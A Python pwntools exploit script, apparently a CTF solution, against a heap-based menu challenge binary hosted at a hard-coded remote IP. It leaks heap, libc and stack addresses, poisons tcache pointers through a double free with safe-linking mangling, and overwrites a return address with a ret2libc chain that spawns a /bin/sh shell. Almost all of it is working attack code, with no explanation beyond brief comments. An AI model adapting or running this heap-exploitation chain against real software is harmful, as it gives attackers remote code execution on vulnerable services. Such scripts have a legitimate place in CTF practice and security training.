#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './challenge_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *main+223
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def view():
    io.sendlineafter(">", "1")

def quest(option):
    io.sendlineafter(">", "2")
    io.sendlineafter(">", str(option).encode())

def completequest():
    io.sendlineafter(">", "3")

def malloc(idx, value=p64(0)*4, atk=0, defend=0):
    io.sendlineafter(">", "4")
    io.sendlineafter(">", str(idx + 1).encode())
    io.sendlineafter(">", "1")
    io.sendlineafter(": ", value)
    io.sendlineafter(": ", str(atk).encode())
    io.sendlineafter(": ", str(defend).encode())

def free(idx):
    io.sendlineafter(">", "4")
    io.sendlineafter(">", str(idx+1).encode())
    io.sendlineafter(">", "2")

def overwrite(target, value):
    global heap, idx_target
    free(idx_target)
    free(1)
    free(11)
    malloc(11, p64(0) + p64(0x41) + p64(mangle(heap, target)))
    malloc(1)
    malloc(idx_target, value[16:], u64(value[:8]), u64(value[8:16]))
    idx_target += 1

def farm_lv():
    quest(1)
    completequest()
    for i in range(5):
       quest(2)
       completequest()
    for i in range(10):
       quest(3)
       completequest()

def exploit():
    # https://github.com/tesuji/ctf-writeups/blob/master/trx-2025/pwn/free/run.py
    global io, heap, idx_target
    io = initialize()
    #Setup
    with log.progress("Leaking heap address"), context.silent:
        io.sendlineafter(b"> ", b"A"*0x1f + b"|")
        farm_lv()
        malloc(0)
        view()
        io.recvuntil("|")
        chunk1 = u64(io.recvline().strip().ljust(8, b"\x00"))
        heap = chunk1 - 0x2a0
        free(0)
        malloc(0, p64(0) + p64(0x41) + p64(heap >> 12))
    log.info("Chunk 1: %#x", chunk1)
    log.info("Heap base: %#x", heap)
 
    #Starting Attack
    with log.progress("Starting attack"), context.silent:
        for i in range(9):
            malloc(i + 1)
        malloc(10) #Padding
        for i in range(9):
            free(i + 1)
    
    #Double free
    with log.progress("Double free"), context.silent:
        free(8)
        for i in reversed(range(7)): #Fill tcache
            malloc(i + 1)
        malloc(8, atk=mangle(heap, chunk1+0x20))
        malloc(9)
        malloc(10)
        malloc(11, p64(0x41)*4) #Target chunk
        next_fakechunk = chunk1 + 0x20 + 0x10 + 0x420
    idx_target = 2
    log.info("Next fake chunk: %#x", next_fakechunk)

    #Leaking libc address
    with log.progress("Leaking libc address"), context.silent:
        overwrite(next_fakechunk, p64(0) + p64(0x21) + p64(0)*3 + p64(0x21))
        free(11)
        malloc(11, p64(0) + p64(0x421))
        free(1)
        view()
        io.recvuntil('Chest: ')
        io.recvuntil('Attack: ')
        libc_leak = int(io.recvline())
        libc.address = libc_leak - 0x211b20
        malloc(1)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    
    #Leaking stack address
    with log.progress("Leaking stack address"), context.silent:
        overwrite(libc.sym["environ"] - 0x18, p64(0)*2 + b"[LEAKS]")
        view()
        io.recvuntil("[LEAKS]\n")
        stack_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
        ret = stack_leak - 0x130
    log.info("Stack leak: %#x", stack_leak)
    log.info("Ret: %#x", ret)

    #Ret2libc
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search("/bin/sh\0")))
    with log.progress("Ret2libc"), context.silent:
        overwrite(ret-0x8, p64(0) + rop.chain())  
    io.interactive()

if __name__ == '__main__':
    exploit()
